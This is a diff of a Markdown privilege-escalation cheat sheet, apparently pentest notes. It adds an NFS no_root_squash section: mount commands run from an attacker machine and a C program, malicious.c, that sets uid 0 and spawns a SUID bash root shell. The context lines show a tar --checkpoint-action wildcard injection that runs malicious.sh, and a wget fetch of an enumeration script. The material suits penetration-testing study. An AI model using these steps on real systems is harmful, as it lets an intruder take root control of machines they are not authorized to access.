@@ -238,18 +238,6 @@ wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.p
 ```
 
 ```text
-
-```
-
-```text
-
-```
-
-```text
-
-```
-
-```text
 # Running strace against a command:
 strace -v -f -e execve <command> 2>&1 | grep exec
 
@@ -400,4 +388,48 @@ chmod +x malicious.sh
 touch ./--checkpoint=1
 touch ./--checkpoint-action=exec=sh\malicious.sh
 ```
+
+## NFS root squashing
+
+Check for `no_root_squash` .
+
+```text
+cat /etc/exports
+```
+
+Then you can list mountable folders from your attacker machine.
+
+```text
+showmount -e <RHOST>
+```
+
+And mount one of them.
+
+```text
+mkdir /tmp/<local_folder>
+mount -o rw,vers=2 <RHOST>:/<remote_folder> /tmp/<local_folder>
+```
+
+Create a .c file inside your newly mounted folder.
+
+{% code title="malicious.c" %}
+```c
+void main(){
+    setgid(0);
+    setuid(0);
+    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
+}
+```
+{% endcode %}
+
+Compile it and set SUID bit on.
+
+```text
+gcc malicious.c -o malicious
+chmod +s malicious
+```
+
+Finally, run it from target machine.
+
+## Docker
 
